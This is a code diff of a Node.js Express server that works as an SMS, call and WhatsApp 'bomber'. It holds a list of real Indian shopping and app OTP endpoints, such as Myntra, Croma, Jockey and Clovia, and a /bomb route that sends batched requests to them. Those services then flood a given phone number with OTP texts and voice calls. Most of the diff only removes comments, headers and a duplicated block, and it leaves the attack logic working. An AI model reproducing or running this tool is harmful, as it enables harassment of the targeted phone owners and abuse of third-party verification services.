@@ -12,19 +12,11 @@ app.use(cors());
 app.use(express.json({ limit: '10mb' }));
 app.use(express.urlencoded({ extended: true, limit: '10mb' }));
 
-// 🔥 CONFIGURATION
 const MAX_DURATION_MIN = 10;
 const BATCH_DELAY_MS = 100;
 const API_DELAY_MS = 50;
 
-// ============================================================
-// ===== 36 UNTESTED APIs =====
-// ============================================================
-
 const APIS = [
-    // ============================================================
-    // 📞 CALL APIs — NAYI (6 APIs)
-    // ============================================================
     {
         name: "Myntra_Voice",
         url: "https://www.myntra.com/gw/mobile-auth/voice-otp",
@@ -73,10 +65,6 @@ const APIS = [
         data: (phone) => JSON.stringify({ phone: phone }),
         type: "call"
     },
-
-    // ============================================================
-    // 💬 WHATSAPP APIs — NAYI (5 APIs)
-    // ============================================================
     {
         name: "Stratzy_WhatsApp",
         url: "https://stratzy.in/api/web/whatsapp/sendOTP",
@@ -89,10 +77,7 @@ const APIS = [
         name: "Jockey_WhatsApp_Resend",
         url: "https://www.jockey.in/apps/jotp/api/login/resend-otp/+91{phone}?whatsapp=true",
         method: "GET",
-        headers: {
-            "accept": "*/*",
-            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36"
-        },
+        headers: { "accept": "*/*" },
         type: "whatsapp"
     },
     {
@@ -119,10 +104,6 @@ const APIS = [
         data: (phone) => JSON.stringify({ mobile: phone, platform: "Android", mode: "new_user", channel: "whatsapp" }),
         type: "whatsapp"
     },
-
-    // ============================================================
-    // 📱 SMS APIs — NAYI (25 APIs)
-    // ============================================================
     {
         name: "Croma",
         url: "https://api.croma.com/otp/generate",
@@ -274,20 +255,14 @@ const APIS = [
         name: "Bella_Vita",
         url: "https://api.codfirm.in/api/customers/login/otp?medium=sms&phoneNumber=%2B91{phone}",
         method: "GET",
-        headers: {
-            "accept": "*/*",
-            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36"
-        },
+        headers: { "accept": "*/*" },
         type: "sms"
     },
     {
         name: "Clovia",
         url: "https://www.clovia.com/api/v4/signup/check-existing-user/?phone={phone}",
         method: "GET",
-        headers: {
-            "accept": "*/*",
-            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36"
-        },
+        headers: { "accept": "*/*" },
         type: "sms"
     },
     {
@@ -296,8 +271,7 @@ const APIS = [
         method: "POST",
         headers: {
             "Content-Type": "application/x-www-form-urlencoded",
-            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36",
-            "apikey": "ixiweb\u00212$",
+            "apikey": "ixiweb\\u00212$",
             "clientid": "ixiweb"
         },
         data: { "_raw": "phone={phone}" },
@@ -343,10 +317,6 @@ console.log(`   💬 WhatsApp: ${APIS.filter(a => a.type === 'whatsapp').length}
 console.log(`   📱 SMS: ${APIS.filter(a => a.type === 'sms').length}`);
 console.log(`⏱️  Max duration cap: ${MAX_DURATION_MIN} minutes`);
 console.log(`⏳ API delay: ${API_DELAY_MS}ms | Batch delay: ${BATCH_DELAY_MS}ms`);
-
-// ============================================================
-// ===== API CALL FUNCTION =====
-// ============================================================
 
 function makeFallbackData(phone, apiName) {
     const lower = apiName.toLowerCase();
@@ -432,22 +402,18 @@ async function makeApiCall(api, phone, retryCount = 0) {
         return { status: response.status, success: true, responseTime };
     } catch (err) {
         const responseTime = Date.now() - startTime;
-        
-        if (retryCount < 1 && 
+
+        if (retryCount < 1 &&
             (err.code === 'ECONNRESET' || err.code === 'ETIMEDOUT' || err.code === 'ECONNABORTED')) {
             return makeApiCall(api, phone, retryCount + 1);
         }
-        
+
         let statusCode = null;
         if (err.response) statusCode = err.response.status;
-        
+
         return { status: statusCode, success: false, responseTime };
     }
 }
-
-// ============================================================
-// ===== ROUTES =====
-// ============================================================
 
 app.get('/', (req, res) => {
     res.json({
@@ -465,7 +431,7 @@ app.get('/', (req, res) => {
 
 app.post('/bomb', async (req, res) => {
     const { phone, duration, instance } = req.body;
-    
+
     if (!phone || phone.length !== 10) {
         return res.status(400).json({ error: 'Invalid phone number. Must be 10 digits.' });
     }
@@ -481,7 +447,7 @@ app.post('/bomb', async (req, res) => {
         let success = 0, smsCount = 0, callCount = 0, whatsappCount = 0;
         const apiList = APIS;
         const BATCH_SIZE = 5;
-        
+
         let maxRequests = 100;
         if (effectiveDuration <= 1) maxRequests = 200;
         else if (effectiveDuration <= 5) maxRequests = 150;
@@ -497,15 +463,15 @@ app.post('/bomb', async (req, res) => {
         let sent = 0;
         for (let i = 0; i < shuffled.length && sent < maxRequests; i += BATCH_SIZE) {
             const batch = shuffled.slice(i, Math.min(i + BATCH_SIZE, shuffled.length));
-            
+
             const results = await Promise.allSettled(
                 batch.map(api => makeApiCall(api, phone))
             );
-            
+
             for (let k = 0; k < results.length; k++) {
                 const result = results[k];
                 const api = batch[k];
-                
+
                 if (result.status === 'fulfilled' && result.value && result.value.success) {
                     success++;
                     sent++;
@@ -513,9 +479,9 @@ app.post('/bomb', async (req, res) => {
                     const isCall = api.type === 'call' || apiName.toLowerCase().includes('call') || apiName.toLowerCase().includes('voice');
                     const isWhatsapp = api.type === 'whatsapp' || apiName.toLowerCase().includes('whatsapp');
                     const type = isCall ? 'CALL' : (isWhatsapp ? 'WA' : 'SMS');
-                    
+
                     console.log(`  ✅ [${success}] ${apiName} → ${result.value.status} (${result.value.responseTime}ms) [${type}]`);
-                    
+
                     if (isCall) callCount++;
                     else if (isWhatsapp) whatsappCount++;
                     else smsCount++;
@@ -526,16 +492,16 @@ app.post('/bomb', async (req, res) => {
                     console.log(`  ❌ ${apiName} → ${status} (${responseTime}ms)`);
                 }
             }
-            
+
             if (i + BATCH_SIZE < shuffled.length && sent < maxRequests) {
                 await new Promise(r => setTimeout(r, BATCH_DELAY_MS));
             }
         }
 
         const elapsed = (Date.now() - startTime) / 1000;
-        
+
         console.log(`✅ Bombing ${phone} done | Sent: ${success} | SMS: ${smsCount} | Calls: ${callCount} | WA: ${whatsappCount} | ${elapsed.toFixed(1)}s\n`);
-        
+
         res.json({
             success: true,
             phone,
@@ -549,7 +515,7 @@ app.post('/bomb', async (req, res) => {
             elapsed: elapsed.toFixed(1) + 's',
             total_apis: APIS.length
         });
-        
+
     } catch (error) {
         console.error('Bombing error:', error);
         res.status(500).json({ error: error.message });
@@ -576,112 +542,6 @@ app.listen(PORT, '0.0.0.0', () => {
     console.log(`   📞 CALL: ${APIS.filter(a => a.type === 'call').length}`);
     console.log(`   💬 WhatsApp: ${APIS.filter(a => a.type === 'whatsapp').length}`);
     console.log(`   📱 SMS: ${APIS.filter(a => a.type === 'sms').length}`);
-    console.log(`⏱️  Max duration: ${MAX_DURATION_MIN} minutes (highest cap)`);
-    console.log(`⏳ API delay: ${API_DELAY_MS}ms`);
-    console.log(`⏳ Batch delay: ${BATCH_DELAY_MS}ms`);
-});
-                const isRL = api.rateLimit ? '[RL]' : '';
-                
-                if (status === 429) {
-                    console.log(`  🚫 ${apiName}${isRL} → 429 RATE_LIMITED (${responseTime}ms)`);
-                } else {
-                    console.log(`  ❌ ${apiName}${isRL} → ${status} (${responseTime}ms)`);
-                }
-            }
-        }
-        
-        if (i + BATCH_SIZE < combined.length && sent < maxRequests) {
-            await new Promise(r => setTimeout(r, BATCH_DELAY_MS));
-        }
-    }
-
-    const elapsed = (Date.now() - startTime) / 1000;
-    
-    return {
-        success, smsCount, callCount, whatsappCount, elapsed: elapsed.toFixed(1)
-    };
-}
-
-// ============================================================
-// ===== ROUTES =====
-// ============================================================
-
-app.get('/', (req, res) => {
-    res.json({
-        status: 'ok',
-        instance: process.env.INSTANCE_NAME || 'api',
-        total_apis: APIS.length,
-        normal_apis: NORMAL_APIS.length,
-        rate_limited_apis: RATE_LIMIT_APIS.length,
-        rate_limit_skip: RATE_LIMIT_SKIP,
-        max_duration_min: MAX_DURATION_MIN,
-        api_delay_ms: API_DELAY_MS,
-        uptime: process.uptime()
-    });
-});
-
-app.post('/bomb', async (req, res) => {
-    const { phone, duration, instance } = req.body;
-    
-    if (!phone || phone.length !== 10) {
-        return res.status(400).json({ error: 'Invalid phone number. Must be 10 digits.' });
-    }
-
-    const requestedDuration = Number(duration) || 1;
-    const effectiveDuration = Math.min(requestedDuration, MAX_DURATION_MIN);
-
-    console.log(`\n📱 Bombing ${phone} | Requested: ${requestedDuration}min | Effective: ${effectiveDuration}min | Instance: ${instance || 'default'}`);
-    console.log(`🧪 Normal: ${NORMAL_APIS.length} | Rate Limited: ${RATE_LIMIT_APIS.length} | Every ${RATE_LIMIT_SKIP} normal → 1 RL`);
-
-    try {
-        const result = await runBombing(phone, effectiveDuration);
-        
-        console.log(`✅ Bombing ${phone} done | Sent: ${result.success} | SMS: ${result.smsCount} | Calls: ${result.callCount} | WA: ${result.whatsappCount} | ${result.elapsed}s\n`);
-        
-        res.json({
-            success: true,
-            phone,
-            requested_duration: requestedDuration,
-            effective_duration: effectiveDuration,
-            instance: instance || 'default',
-            totalSent: result.success,
-            sms: result.smsCount,
-            calls: result.callCount,
-            whatsapp: result.whatsappCount,
-            elapsed: result.elapsed + 's',
-            total_apis: APIS.length,
-            normal_apis: NORMAL_APIS.length,
-            rate_limited_apis: RATE_LIMIT_APIS.length
-        });
-        
-    } catch (error) {
-        console.error('Bombing error:', error);
-        res.status(500).json({ error: error.message });
-    }
-});
-
-app.get('/apis', (req, res) => {
-    res.json({
-        total: APIS.length,
-        normal_apis: NORMAL_APIS.length,
-        rate_limited_apis: RATE_LIMIT_APIS.length,
-        rate_limit_skip: RATE_LIMIT_SKIP,
-        max_duration_min: MAX_DURATION_MIN,
-        api_delay_ms: API_DELAY_MS,
-        normal_api_names: NORMAL_APIS.map(a => a.name),
-        rate_limited_api_names: RATE_LIMIT_APIS.map(a => a.name),
-        instances: process.env.INSTANCE_NAME || 'api'
-    });
-});
-
-const PORT = process.env.PORT || 10000;
-app.listen(PORT, '0.0.0.0', () => {
-    console.log(`🚀 API Server running on port ${PORT}`);
-    console.log(`📡 Instance: ${process.env.INSTANCE_NAME || 'default'}`);
-    console.log(`📊 Total APIs: ${APIS.length}`);
-    console.log(`   🟢 Normal APIs: ${NORMAL_APIS.length}`);
-    console.log(`   ⚠️  Rate Limited APIs: ${RATE_LIMIT_APIS.length}`);
-    console.log(`📊 Rate Limit Skip: Har ${RATE_LIMIT_SKIP} normal APIs ke baad 1 rate limited API`);
     console.log(`⏱️  Max duration: ${MAX_DURATION_MIN} minutes (highest cap)`);
     console.log(`⏳ API delay: ${API_DELAY_MS}ms`);
     console.log(`⏳ Batch delay: ${BATCH_DELAY_MS}ms`);
